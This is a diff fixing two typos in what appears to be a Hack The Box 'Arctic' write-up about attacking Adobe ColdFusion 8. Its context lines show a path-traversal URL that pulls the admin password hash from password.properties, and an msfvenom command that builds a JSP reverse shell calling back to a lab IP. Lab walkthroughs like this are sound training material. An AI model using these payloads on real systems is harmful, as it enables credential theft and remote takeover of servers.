@@ -54,7 +54,7 @@ From these selections, `/administrator` looks the most interesting. This brings 
 
 ### LFI in password field
 
-In doing some online searching, [this post](https://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html) pointed to towards a known vulnerability in CF8 ([APSB10-18](https://www.adobe.com/support/security/bulletins/apsb10-18.html)), where we can extract the password hash from the internal `password.properties` file. The example given for the LFI would be something like the URL below.
+In doing some online searching, [this post](https://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html) pointed to a known vulnerability in CF8 ([APSB10-18](https://www.adobe.com/support/security/bulletins/apsb10-18.html)), where we can extract the password hash from the internal `password.properties` file. The example given for the LFI would be something like the URL below.
 
 ```
 http://[HOSTNAME:PORT]</span>/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%en
@@ -92,7 +92,7 @@ Once we're in the admin panel, we can navigate to the section labeled *Dubugging
 
 ![](/assets/htb-arctic/cf_schedualed_tasks.png)
 
-As you can see, it appears to try to pull form the URL we specify at the interval we set. By default, ColdFusion runs `*.cfm` extensions, but will also run JSP files. We can create a malicious JSP file with `msfvenom`, using the below code.
+As you can see, it appears to try to pull from the URL we specify at the interval we set. By default, ColdFusion runs `*.cfm` extensions, but will also run JSP files. We can create a malicious JSP file with `msfvenom`, using the below code.
 
 ```
 msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.34 lport=7500 -f raw > shell.jsp
